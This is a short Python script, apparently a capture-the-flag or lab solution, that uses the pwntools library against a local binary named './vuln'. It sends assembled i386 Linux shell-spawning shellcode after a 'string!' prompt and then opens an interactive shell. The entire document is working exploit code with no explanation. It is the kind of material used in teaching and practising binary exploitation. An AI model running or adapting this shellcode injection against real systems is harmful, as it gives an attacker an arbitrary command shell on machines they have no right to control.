from pwn import *

s = process('./vuln')

s.sendlineafter("string!", asm(shellcraft.i386.linux.sh()))

s.interactive()